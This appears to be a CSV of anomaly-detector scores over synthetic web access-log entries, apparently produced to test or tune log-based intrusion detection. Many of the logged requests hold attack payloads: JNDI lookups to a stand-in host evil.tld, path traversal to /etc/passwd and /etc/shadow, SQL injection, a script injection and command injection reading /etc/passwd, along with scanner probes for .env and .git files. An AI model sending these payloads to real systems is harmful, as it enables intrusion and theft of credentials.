score_content,score_session,score_fused,score_fused_norm,line
30165.025390625,,30165.025390625,30165.025390625,125.162.126.49 - - [10/Jan/2025:12:09:12 +0000] "GET /search?q=headphones HTTP/1.1" 429 1000 "-" "sqlmap/1.7.2#stable"
75.54837036132812,,75.54837036132812,75.54837036132812,86.131.156.240 - - [10/Jan/2025:12:09:15 +0000] "OPTIONS /dashboard HTTP/1.1" 304 8229 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.20485657453536987,,0.20485657453536987,0.20485657453536987,167.144.62.228 - - [10/Jan/2025:12:09:18 +0000] "GET /assets/app.css HTTP/1.1" 200 6606 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
106.93704223632812,,106.93704223632812,106.93704223632812,41.75.190.182 - - [10/Jan/2025:12:09:20 +0000] "TRACE /login HTTP/1.1" 302 16877 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.10654561966657639,,0.10654561966657639,0.10654561966657639,188.95.124.74 - - [10/Jan/2025:12:09:22 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 19155 "https://news.ycombinator.com/" "curl/7.85.0"
3.2108314037323,,3.2108314037323,3.2108314037323,248.56.47.166 - - [10/Jan/2025:12:09:23 +0000] "GET /.git/config HTTP/1.1" 304 10330 "https://twitter.com/" "dirb/2.22"
2.7907841205596924,,2.7907841205596924,2.7907841205596924,50.231.175.238 - - [10/Jan/2025:12:09:24 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7192 "https://example.com/" "curl/7.85.0"
13.16611385345459,,13.16611385345459,13.16611385345459,49.150.179.141 - - [10/Jan/2025:12:09:27 +0000] "PUT /profile HTTP/1.1" 200 8664 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.16789627075195,,47.16789627075195,47.16789627075195,98.33.68.159 - - [10/Jan/2025:12:09:29 +0000] "HEAD /api/products HTTP/1.1" 200 164 "https://example.com/" "curl/7.85.0"
72.47232818603516,,72.47232818603516,72.47232818603516,110.90.90.1 - - [10/Jan/2025:12:09:31 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 3994 "https://example.com/" "python-requests/2.31.0"
95.09965515136719,,95.09965515136719,95.09965515136719,140.116.253.155 - - [10/Jan/2025:12:09:34 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 8730 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30139.96875,,30139.96875,30139.96875,208.148.88.112 - - [10/Jan/2025:12:09:37 +0000] "GET /index.html HTTP/1.1" 404 1110 "https://twitter.com/" "sqlmap/1.7.2#stable"
30141.9765625,,30141.9765625,30141.9765625,130.113.239.118 - - [10/Jan/2025:12:09:37 +0000] "GET / HTTP/1.1" 404 434 "https://twitter.com/" "sqlmap/1.7.2#stable"
24.348909378051758,,24.348909378051758,24.348909378051758,69.244.41.64 - - [10/Jan/2025:12:09:39 +0000] "GET /search?q=laptop HTTP/1.1" 200 650 "https://www.google.com/" "dirb/2.22"
30241.720703125,,30241.720703125,30241.720703125,5.253.69.105 - - [10/Jan/2025:12:09:41 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 403 992 "-" "sqlmap/1.7.2#stable"
103.95532989501953,,103.95532989501953,103.95532989501953,61.24.237.89 - - [10/Jan/2025:12:09:43 +0000] "TRACE /profile HTTP/1.1" 200 9422 "-" "sqlmap/1.7.2#stable"
30.178436279296875,,30.178436279296875,30.178436279296875,216.18.153.81 - - [10/Jan/2025:12:09:43 +0000] "DELETE /logout HTTP/1.1" 301 3589 "https://twitter.com/" "curl/7.85.0"
30168.017578125,,30168.017578125,30168.017578125,22.190.232.186 - - [10/Jan/2025:12:09:44 +0000] "DELETE /api/products HTTP/1.1" 429 662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.715074062347412,,7.715074062347412,7.715074062347412,163.109.20.249 - - [10/Jan/2025:12:09:45 +0000] "POST /about HTTP/1.1" 304 1375 "https://www.google.com/" "curl/7.85.0"
2.310819149017334,,2.310819149017334,2.310819149017334,184.36.17.11 - - [10/Jan/2025:12:09:47 +0000] "GET / HTTP/1.1" 200 9388 "https://twitter.com/" "python-requests/2.31.0"
24.401060104370117,,24.401060104370117,24.401060104370117,97.164.223.102 - - [10/Jan/2025:12:09:49 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 10745 "-" "dirb/2.22"
1.9551464319229126,,1.9551464319229126,1.9551464319229126,54.204.192.173 - - [10/Jan/2025:12:09:49 +0000] "GET /api/products HTTP/1.1" 201 3849 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.296560049057007,,2.296560049057007,2.296560049057007,64.195.44.219 - - [10/Jan/2025:12:09:50 +0000] "GET / HTTP/1.1" 200 5064 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
13.238744735717773,,13.238744735717773,13.238744735717773,194.235.232.114 - - [10/Jan/2025:12:09:51 +0000] "PUT /admin HTTP/1.1" 200 8208 "https://twitter.com/" "sqlmap/1.7.2#stable"
75.48943328857422,,75.48943328857422,75.48943328857422,116.78.39.119 - - [10/Jan/2025:12:09:51 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 19459 "-" "nikto/2.5.0"
30266.912109375,,30266.912109375,30266.912109375,125.81.114.221 - - [10/Jan/2025:12:09:53 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 429 1282 "https://twitter.com/" "nikto/2.5.0"
71.21621704101562,,71.21621704101562,71.21621704101562,128.162.239.82 - - [10/Jan/2025:12:09:56 +0000] "OPTIONS /.env HTTP/1.1" 200 12146 "https://www.google.com/" "dirb/2.22"
30163.8125,,30163.8125,30163.8125,201.135.23.10 - - [10/Jan/2025:12:09:59 +0000] "GET /search?q=headphones HTTP/1.1" 401 512 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
126.1754379272461,,126.1754379272461,126.1754379272461,230.60.118.10 - - [10/Jan/2025:12:09:59 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13966 "https://twitter.com/" "python-requests/2.31.0"
24.39757537841797,,24.39757537841797,24.39757537841797,188.112.229.39 - - [10/Jan/2025:12:10:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 9336 "https://news.ycombinator.com/" "curl/7.85.0"
27.324932098388672,,27.324932098388672,27.324932098388672,128.5.111.232 - - [10/Jan/2025:12:10:03 +0000] "DELETE /contact HTTP/1.1" 200 16693 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11079.04296875,,11079.04296875,11079.04296875,114.218.196.174 - - [10/Jan/2025:12:10:03 +0000] "DELETE /search?q=monitor HTTP/1.1" 502 1167 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
27.086406707763672,,27.086406707763672,27.086406707763672,60.91.164.149 - - [10/Jan/2025:12:10:03 +0000] "POST /search?q=phone HTTP/1.1" 204 10827 "-" "sqlmap/1.7.2#stable"
4.811079502105713,,4.811079502105713,4.811079502105713,103.117.73.194 - - [10/Jan/2025:12:10:06 +0000] "POST /login HTTP/1.1" 200 8186 "-" "dirb/2.22"
0.21998125314712524,,0.21998125314712524,0.21998125314712524,56.200.243.79 - - [10/Jan/2025:12:10:08 +0000] "GET /assets/app.js HTTP/1.1" 200 3518 "https://www.google.com/" "python-requests/2.31.0"
126.30683135986328,,126.30683135986328,126.30683135986328,188.134.37.89 - - [10/Jan/2025:12:10:08 +0000] "TRACE /search?q=camera HTTP/1.1" 204 17363 "https://twitter.com/" "python-requests/2.31.0"
126.2995834350586,,126.2995834350586,126.2995834350586,21.172.93.55 - - [10/Jan/2025:12:10:09 +0000] "TRACE /search?q=camera HTTP/1.1" 200 12241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.374897003173828,,24.374897003173828,24.374897003173828,137.19.13.109 - - [10/Jan/2025:12:10:11 +0000] "GET /search?q=router HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30189.423828125,,30189.423828125,30189.423828125,21.177.129.244 - - [10/Jan/2025:12:10:13 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 1370 "https://news.ycombinator.com/" "nikto/2.5.0"
126.2099380493164,,126.2099380493164,126.2099380493164,242.201.95.7 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=headphones HTTP/1.1" 204 9491 "https://example.com/" "sqlmap/1.7.2#stable"
30265.88671875,,30265.88671875,30265.88671875,172.106.193.132 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=router HTTP/1.1" 403 1353 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30185.185546875,,30185.185546875,30185.185546875,237.216.83.55 - - [10/Jan/2025:12:10:14 +0000] "HEAD /.env HTTP/1.1" 401 1249 "https://twitter.com/" "nikto/2.5.0"
27.287336349487305,,27.287336349487305,27.287336349487305,150.238.80.153 - - [10/Jan/2025:12:10:14 +0000] "GET /search?q=laptop HTTP/1.1" 304 18125 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11031.9267578125,,11031.9267578125,11031.9267578125,126.72.17.62 - - [10/Jan/2025:12:10:14 +0000] "GET / HTTP/1.1" 503 760 "https://news.ycombinator.com/" "curl/7.85.0"
102.24010467529297,,102.24010467529297,102.24010467529297,212.141.106.128 - - [10/Jan/2025:12:10:16 +0000] "TRACE /.git/config HTTP/1.1" 200 15275 "https://twitter.com/" "sqlmap/1.7.2#stable"
49.56951904296875,,49.56951904296875,49.56951904296875,220.227.219.61 - - [10/Jan/2025:12:10:17 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 13969 "https://www.google.com/" "nikto/2.5.0"
0.32231661677360535,,0.32231661677360535,0.32231661677360535,10.145.62.44 - - [10/Jan/2025:12:10:17 +0000] "GET /index.html HTTP/1.1" 200 9505 "https://www.google.com/" "dirb/2.22"
35.474117279052734,,35.474117279052734,35.474117279052734,135.184.13.170 - - [10/Jan/2025:12:10:17 +0000] "PUT /search?q=camera HTTP/1.1" 200 2946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26358816027641296,,0.26358816027641296,0.26358816027641296,82.76.130.243 - - [10/Jan/2025:12:10:20 +0000] "GET /assets/app.js HTTP/1.1" 200 18185 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9446464776992798,,1.9446464776992798,1.9446464776992798,234.170.119.150 - - [10/Jan/2025:12:10:22 +0000] "GET /phpmyadmin HTTP/1.1" 200 16711 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.347789764404297,,24.347789764404297,24.347789764404297,95.152.244.220 - - [10/Jan/2025:12:10:24 +0000] "GET /search?q=monitor HTTP/1.1" 200 383 "-" "dirb/2.22"
126.28784942626953,,126.28784942626953,126.28784942626953,66.65.185.75 - - [10/Jan/2025:12:10:27 +0000] "TRACE /search?q=router HTTP/1.1" 200 763 "-" "python-requests/2.31.0"
102.2051010131836,,102.2051010131836,102.2051010131836,184.128.26.38 - - [10/Jan/2025:12:10:30 +0000] "TRACE /.git/config HTTP/1.1" 200 3848 "https://www.google.com/" "python-requests/2.31.0"
95.0752182006836,,95.0752182006836,95.0752182006836,111.20.157.165 - - [10/Jan/2025:12:10:32 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 8176 "https://example.com/" "curl/7.85.0"
27.301959991455078,,27.301959991455078,27.301959991455078,222.157.91.69 - - [10/Jan/2025:12:10:34 +0000] "DELETE /contact HTTP/1.1" 200 8843 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30139.857421875,,30139.857421875,30139.857421875,163.216.171.26 - - [10/Jan/2025:12:10:35 +0000] "GET /assets/app.css HTTP/1.1" 404 1343 "https://twitter.com/" "python-requests/2.31.0"
2.2910585403442383,,2.2910585403442383,2.2910585403442383,64.75.88.1 - - [10/Jan/2025:12:10:37 +0000] "GET / HTTP/1.1" 201 3866 "-" "sqlmap/1.7.2#stable"
126.27639770507812,,126.27639770507812,126.27639770507812,18.19.6.31 - - [10/Jan/2025:12:10:40 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 13364 "-" "curl/7.85.0"
0.23448485136032104,,0.23448485136032104,0.23448485136032104,4.136.95.162 - - [10/Jan/2025:12:10:43 +0000] "GET /assets/app.css HTTP/1.1" 200 16374 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.200014114379883,,27.200014114379883,27.200014114379883,200.166.118.149 - - [10/Jan/2025:12:10:45 +0000] "DELETE /phpmyadmin HTTP/1.1" 200 7830 "-" "dirb/2.22"
0.25186097621917725,,0.25186097621917725,0.25186097621917725,80.92.190.230 - - [10/Jan/2025:12:10:47 +0000] "GET /assets/app.js HTTP/1.1" 200 13791 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
47.154544830322266,,47.154544830322266,47.154544830322266,230.203.11.43 - - [10/Jan/2025:12:10:47 +0000] "HEAD /profile HTTP/1.1" 200 11946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.015435218811035,,13.015435218811035,13.015435218811035,75.242.237.19 - - [10/Jan/2025:12:10:48 +0000] "PUT /server-status HTTP/1.1" 200 19759 "https://twitter.com/" "curl/7.85.0"
94.95565795898438,,94.95565795898438,94.95565795898438,45.220.5.146 - - [10/Jan/2025:12:10:48 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 9836 "https://twitter.com/" "nikto/2.5.0"
103.88908386230469,,103.88908386230469,103.88908386230469,235.62.229.227 - - [10/Jan/2025:12:10:48 +0000] "TRACE /dashboard HTTP/1.1" 200 9814 "-" "curl/7.85.0"
126.38381958007812,,126.38381958007812,126.38381958007812,90.32.191.102 - - [10/Jan/2025:12:10:49 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 16114 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.02175903320312,,95.02175903320312,95.02175903320312,82.18.151.30 - - [10/Jan/2025:12:10:49 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 16908 "-" "python-requests/2.31.0"
75.51250457763672,,75.51250457763672,75.51250457763672,125.4.245.47 - - [10/Jan/2025:12:10:50 +0000] "OPTIONS /dashboard HTTP/1.1" 301 16240 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9417083263397217,,1.9417083263397217,1.9417083263397217,220.6.173.65 - - [10/Jan/2025:12:10:52 +0000] "GET /dashboard HTTP/1.1" 200 5518 "-" "dirb/2.22"
126.1422119140625,,126.1422119140625,126.1422119140625,224.114.217.173 - - [10/Jan/2025:12:10:55 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3034 "https://example.com/" "python-requests/2.31.0"
26.97308921813965,,26.97308921813965,26.97308921813965,94.69.16.228 - - [10/Jan/2025:12:10:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3452 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30209.287109375,,30209.287109375,30209.287109375,179.253.116.242 - - [10/Jan/2025:12:10:58 +0000] "HEAD /search?q=headphones HTTP/1.1" 403 15 "https://news.ycombinator.com/" "dirb/2.22"
11078.919921875,,11078.919921875,11078.919921875,174.120.207.109 - - [10/Jan/2025:12:10:59 +0000] "DELETE /search?q=monitor HTTP/1.1" 500 1199 "-" "Wget/1.21.2 (linux-gnu)"
126.35653686523438,,126.35653686523438,126.35653686523438,204.247.252.244 - - [10/Jan/2025:12:11:02 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 7100 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.54794311523438,,69.54794311523438,69.54794311523438,116.10.90.225 - - [10/Jan/2025:12:11:04 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 17119 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.320402145385742,,2.320402145385742,2.320402145385742,80.228.158.82 - - [10/Jan/2025:12:11:05 +0000] "GET / HTTP/1.1" 200 12489 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.63019561767578,,72.63019561767578,72.63019561767578,200.96.36.129 - - [10/Jan/2025:12:11:08 +0000] "OPTIONS /api/products HTTP/1.1" 201 3490 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.839003086090088,,4.839003086090088,4.839003086090088,43.159.241.69 - - [10/Jan/2025:12:11:09 +0000] "POST /about HTTP/1.1" 200 17754 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.31130599975586,,45.31130599975586,45.31130599975586,50.108.157.50 - - [10/Jan/2025:12:11:10 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 15447 "https://www.google.com/" "curl/7.85.0"
94.98821258544922,,94.98821258544922,94.98821258544922,44.248.220.134 - - [10/Jan/2025:12:11:11 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 3186 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.913201808929443,,4.913201808929443,4.913201808929443,21.203.222.244 - - [10/Jan/2025:12:11:14 +0000] "GET /profile HTTP/1.1" 302 14679 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
49.59864807128906,,49.59864807128906,49.59864807128906,138.89.2.192 - - [10/Jan/2025:12:11:17 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 1027 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.0391976833343506,,2.0391976833343506,2.0391976833343506,130.181.61.49 - - [10/Jan/2025:12:11:17 +0000] "GET /logout HTTP/1.1" 200 3308 "https://news.ycombinator.com/" "dirb/2.22"
95.09748077392578,,95.09748077392578,95.09748077392578,133.105.54.95 - - [10/Jan/2025:12:11:17 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 15575 "https://news.ycombinator.com/" "nikto/2.5.0"
30186.685546875,,30186.685546875,30186.685546875,174.67.94.224 - - [10/Jan/2025:12:11:18 +0000] "HEAD /profile HTTP/1.1" 401 549 "https://twitter.com/" "dirb/2.22"
0.3109731078147888,,0.3109731078147888,0.3109731078147888,39.197.245.68 - - [10/Jan/2025:12:11:20 +0000] "GET /index.html HTTP/1.1" 200 6077 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2610635459423065,,0.2610635459423065,0.2610635459423065,187.45.19.9 - - [10/Jan/2025:12:11:23 +0000] "GET /assets/app.js HTTP/1.1" 200 17192 "https://news.ycombinator.com/" "curl/7.85.0"
11.297211647033691,,11.297211647033691,11.297211647033691,165.58.207.73 - - [10/Jan/2025:12:11:24 +0000] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2213 "-" "python-requests/2.31.0"
4.960269451141357,,4.960269451141357,4.960269451141357,177.159.248.210 - - [10/Jan/2025:12:11:27 +0000] "GET /logout HTTP/1.1" 304 5379 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
95.0689468383789,,95.0689468383789,95.0689468383789,212.58.248.155 - - [10/Jan/2025:12:11:30 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 6297 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.166173934936523,,27.166173934936523,27.166173934936523,174.248.53.113 - - [10/Jan/2025:12:11:33 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 217 "-" "python-requests/2.31.0"
2.3086419105529785,,2.3086419105529785,2.3086419105529785,84.38.92.241 - - [10/Jan/2025:12:11:35 +0000] "GET / HTTP/1.1" 200 8718 "https://www.google.com/" "dirb/2.22"
14.351940155029297,,14.351940155029297,14.351940155029297,98.243.90.249 - - [10/Jan/2025:12:11:35 +0000] "PUT /.git/config HTTP/1.1" 304 8626 "https://twitter.com/" "curl/7.85.0"
48.56951904296875,,48.56951904296875,48.56951904296875,39.215.185.42 - - [10/Jan/2025:12:11:35 +0000] "HEAD /.env HTTP/1.1" 304 6987 "https://www.google.com/" "nikto/2.5.0"
72.76840209960938,,72.76840209960938,72.76840209960938,75.89.67.81 - - [10/Jan/2025:12:11:36 +0000] "OPTIONS /login HTTP/1.1" 200 8476 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
72.25678253173828,,72.25678253173828,72.25678253173828,123.179.82.206 - - [10/Jan/2025:12:11:37 +0000] "HEAD /search?q=headphones HTTP/1.1" 301 9505 "https://www.google.com/" "python-requests/2.31.0"
0.18136510252952576,,0.18136510252952576,0.18136510252952576,213.244.119.169 - - [10/Jan/2025:12:11:37 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 13024 "-" "python-requests/2.31.0"
11.663028717041016,,11.663028717041016,11.663028717041016,14.244.98.198 - - [10/Jan/2025:12:11:40 +0000] "PUT /.env HTTP/1.1" 200 3833 "https://twitter.com/" "python-requests/2.31.0"
72.75917053222656,,72.75917053222656,72.75917053222656,68.111.181.190 - - [10/Jan/2025:12:11:40 +0000] "OPTIONS /login HTTP/1.1" 200 5670 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
49.64321517944336,,49.64321517944336,49.64321517944336,28.130.76.145 - - [10/Jan/2025:12:11:40 +0000] "DELETE /search?q=router HTTP/1.1" 200 13782 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.146552085876465,,13.146552085876465,13.146552085876465,68.206.204.129 - - [10/Jan/2025:12:11:40 +0000] "PUT /api/products HTTP/1.1" 200 18166 "https://www.google.com/" "dirb/2.22"
69.53795623779297,,69.53795623779297,69.53795623779297,174.190.106.152 - - [10/Jan/2025:12:11:40 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 6302 "https://news.ycombinator.com/" "nikto/2.5.0"
0.23453043401241302,,0.23453043401241302,0.23453043401241302,206.171.54.124 - - [10/Jan/2025:12:11:40 +0000] "GET /assets/app.js HTTP/1.1" 200 794 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11053.724609375,,11053.724609375,11053.724609375,232.176.205.85 - - [10/Jan/2025:12:11:41 +0000] "GET /search?q=phone HTTP/1.1" 500 1131 "https://twitter.com/" "curl/7.85.0"
95.02869415283203,,95.02869415283203,95.02869415283203,47.203.92.54 - - [10/Jan/2025:12:11:43 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 18842 "https://example.com/" "dirb/2.22"
72.31838989257812,,72.31838989257812,72.31838989257812,253.5.24.209 - - [10/Jan/2025:12:11:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 302 7733 "https://example.com/" "python-requests/2.31.0"
2.101005792617798,,2.101005792617798,2.101005792617798,208.218.124.237 - - [10/Jan/2025:12:11:49 +0000] "GET /admin HTTP/1.1" 200 10959 "https://twitter.com/" "curl/7.85.0"
27.263517379760742,,27.263517379760742,27.263517379760742,239.125.120.249 - - [10/Jan/2025:12:11:52 +0000] "DELETE /api/products HTTP/1.1" 200 11507 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11.301326751708984,,11.301326751708984,11.301326751708984,203.247.195.216 - - [10/Jan/2025:12:11:53 +0000] "PUT /../../etc/passwd HTTP/1.1" 200 4679 "https://twitter.com/" "python-requests/2.31.0"
0.2292385995388031,,0.2292385995388031,0.2292385995388031,70.188.194.238 - - [10/Jan/2025:12:11:54 +0000] "GET /assets/app.css HTTP/1.1" 200 14439 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.02859497070312,,95.02859497070312,95.02859497070312,125.52.235.175 - - [10/Jan/2025:12:11:54 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 9434 "https://www.google.com/" "curl/7.85.0"
95.10026550292969,,95.10026550292969,95.10026550292969,161.104.240.27 - - [10/Jan/2025:12:11:55 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 16998 "https://twitter.com/" "python-requests/2.31.0"
52.5289306640625,,52.5289306640625,52.5289306640625,16.139.160.79 - - [10/Jan/2025:12:11:58 +0000] "DELETE /search?q=router HTTP/1.1" 302 17598 "-" "Wget/1.21.2 (linux-gnu)"
25.557598114013672,,25.557598114013672,25.557598114013672,4.1.208.119 - - [10/Jan/2025:12:11:58 +0000] "DELETE /wp-login.php HTTP/1.1" 200 13237 "https://www.google.com/" "python-requests/2.31.0"
30189.349609375,,30189.349609375,30189.349609375,31.122.213.230 - - [10/Jan/2025:12:12:01 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 403 604 "-" "nikto/2.5.0"
30186.80078125,,30186.80078125,30186.80078125,107.221.182.138 - - [10/Jan/2025:12:12:04 +0000] "HEAD /about HTTP/1.1" 401 216 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.419330596923828,,11.419330596923828,11.419330596923828,18.245.25.29 - - [10/Jan/2025:12:12:04 +0000] "PUT /.git/config HTTP/1.1" 200 2765 "-" "sqlmap/1.7.2#stable"
29.902681350708008,,29.902681350708008,29.902681350708008,162.190.241.187 - - [10/Jan/2025:12:12:06 +0000] "POST /search?q=camera HTTP/1.1" 301 3222 "https://twitter.com/" "nikto/2.5.0"
27.276081085205078,,27.276081085205078,27.276081085205078,240.20.82.145 - - [10/Jan/2025:12:12:09 +0000] "GET /search?q=ssd HTTP/1.1" 302 2461 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.03842163085938,,104.03842163085938,104.03842163085938,130.166.158.41 - - [10/Jan/2025:12:12:11 +0000] "TRACE /login HTTP/1.1" 200 12317 "-" "Wget/1.21.2 (linux-gnu)"
